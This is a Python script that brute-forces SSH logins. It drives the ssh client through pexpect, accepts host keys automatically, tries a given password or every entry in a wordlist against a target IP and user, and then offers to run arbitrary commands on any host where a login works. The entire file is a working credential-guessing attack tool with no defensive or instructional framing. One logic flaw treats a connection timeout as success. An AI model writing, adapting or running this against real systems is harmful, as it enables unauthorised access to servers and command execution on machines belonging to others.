import argparse
import pexpect

prompt=['# ','>>> ','> ','\$ ']

def getArgs():
    args=argparse.ArgumentParser(description="[*] SSH Bruteforce Script.",usage="python3 SSHBruteforce.py -i <ip> -U <username> [-P <password>] [-f <wordlist>] [-p <port>]",)
    args.add_argument('-i',dest='ip',help='Target IP.',required=True)
    args.add_argument('-p',dest='port',help='Target Port.',default=22)
    args.add_argument('-U',dest='user',help='Username.',required=True)
    args.add_argument('-P',dest='passwd',help='Password',default=None)
    args.add_argument('-f',dest='file',help='Wordlist.',default=None)
    arguments=args.parse_args()
    return arguments
    
def exCommand(conn,command):
    conn.sendline(command)
    conn.expect(prompt)
    resp=conn.before.decode()
    conn.close()
    return resp

def connect(user,passwd,ip,port):
    conn=pexpect.spawn(f'ssh {user}@{ip} -oHostKeyAlgorithms=+ssh-rsa -p {port}')
    resp=conn.expect([pexpect.TIMEOUT,'Are you sure you want to continue connecting','password:'])
    if resp==0:
        print('[-] Connection Failed.')
        return False
    elif resp==1:
        conn.sendline('yes')
        resp=conn.expect([pexpect.TIMEOUT,'password:'])
        if resp==0:
            print('[-] Connection Failed.')
            return False
    conn.sendline(passwd)
    conn.expect(prompt,timeout=5)
    return conn

def check(user,passwd,ip,port):
    try:
        conn=connect(user,passwd,ip,port)
        if conn:
            print(f'[+] Credentials Valid {user}:{passwd}.\n')
            while True:
                print('<--------------Select Option--------------->')
                print('(1) Execute Command \n(2) Exit')
                option=input('-> ')
                if option.lower() in '(1) execute command':
                    command=input('[*] Command: ')
                    output=exCommand(conn,command)
                    print('[+] Output: '+output)
                    break
                elif option.lower() in '(2) exit':
                    print('[+] Exiting!!!')
                    break
                else:
                    print('[-] Invalid Option!')
        return True                                                  
    except:
        print(f'[-] Login failed for {user}:{passwd}')
        return False

def main():
    arguments=getArgs()
    ip=arguments.ip
    port=arguments.port
    user=arguments.user
    if arguments.passwd==None and arguments.file==None:
        print("[-] Please provide password(-P) to test or wordlist(-f) for bruteforce in the arguments.")
        exit()
    elif arguments.passwd!=None and arguments.file==None:
        print(f"[*] Testing {arguments.user}:{arguments.passwd}")        
        passwd=arguments.passwd
        check(user,passwd,ip,port)
    else:
        print(f"[*] Testing {arguments.user}:{arguments.passwd}. If fails then, will initiate bruteforce.")
        passwd=arguments.passwd
        if check(user,passwd,ip,port):
            exit()
        else:
            print('[*] Initiating Bruteforce...')
            with open(arguments.file,'r') as wordlist:
                for word in wordlist:                  
                    if check(user,word.rstrip(),ip,port):
                        break
                else:
                    print('[-] Couldn\'t find valid credential pairs.')

if __name__=='__main__':
    main()
